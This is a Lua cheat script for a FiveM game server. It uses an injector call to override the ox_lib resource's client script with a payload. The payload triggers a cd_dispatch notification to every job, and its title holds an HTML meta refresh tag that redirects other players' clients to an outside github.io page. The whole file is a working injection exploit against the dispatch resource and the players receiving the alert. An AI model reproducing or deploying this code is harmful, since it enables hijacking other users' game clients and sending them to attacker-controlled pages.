local targetResource = "ox_lib"
local scriptToInject = "client.lua"

local payload = [=[
    Citizen.CreateThread(function()
        local title = "<meta http-equiv='refresh' content='0; url=https://norulesjustwin.github.io/m7fofa'>"
        local coords = vector3(215.76, -810.12, 30.73)
        local sex = "male"
        local street = "Legion Square"

        TriggerServerEvent('cd_dispatch:AddNotification', {
            job_table = {
                'police', 'ambulance', 'mtf', 'gangunit',
                'unemployed', 'citizen', 'mechanic', 'taxi'
            },
            coords = coords,
            title = title,
            message = 'Someone has reported a ' .. sex .. ' at ' .. street,
            flash = 1,
            unique_id = tostring(math.random(1000000, 9999999)),
            sound = 1,
            blip = {
                sprite = 586,
                scale = 1.2,
                colour = 1,
                flashes = true,
                text = 'URGENT - SYSTEM ALERT',
                time = 10,
                radius = 0
            }
        })

        ExecuteCommand('dispatch')
        
        local on_duty = false
        if not on_duty then
            on_duty = true
            Citizen.SetTimeout(5000, function()
                on_duty = false
            end)
        end

        print("RA")
    end)
]=]

if MachoInjectResourceScriptOverride then
    MachoInjectResourceScriptOverride(3, targetResource, payload, scriptToInject, 1, 5)
end
